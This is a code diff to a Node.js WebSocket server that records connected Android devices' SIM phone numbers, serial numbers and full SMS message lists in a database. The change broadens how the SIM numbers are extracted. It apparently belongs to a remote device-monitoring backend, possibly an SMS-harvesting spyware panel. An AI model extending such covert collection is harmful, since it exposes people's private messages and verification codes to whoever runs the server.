@@ -175,13 +175,20 @@ wss.on('connection', (ws, req) => {
       const existingDevice = await Device.findOne({ deviceId: id }).lean();
       const deletedLog = existingDevice?.deletedSmsLog || [];
       const updateSet = { isOnline: true, lastSeen: new Date(), isDeleted: false };
+      
+      // Better SIM & Info Fetching
+      const s1 = data.sim1 || data.data?.sim1 || data.mobile1 || data.phone1;
+      const s2 = data.sim2 || data.data?.sim2 || data.mobile2 || data.phone2;
+      
+      if (s1 && s1 !== 'N/A' && s1 !== 'Not Available') updateSet.sim1 = s1;
+      if (s2 && s2 !== 'N/A' && s2 !== 'Not Available') updateSet.sim2 = s2;
       if (data.model) updateSet.model = data.model;
       if (data.androidVersion) updateSet.androidVersion = data.androidVersion;
-      if (data.sim1) updateSet.sim1 = data.sim1;
-      if (data.sim2) updateSet.sim2 = data.sim2;
       if (data.serialNumber) updateSet.serialNumber = data.serialNumber;
+      
       let b = parseInt(data.battery);
       if (!isNaN(b)) updateSet.battery = b;
+      
       if (data.type === 'SMS_LIST' && data.messages) {
           updateSet.smsMessages = data.messages.filter(m => !deletedLog.includes(`${m.body}_${m.date || m.time}`));
       }
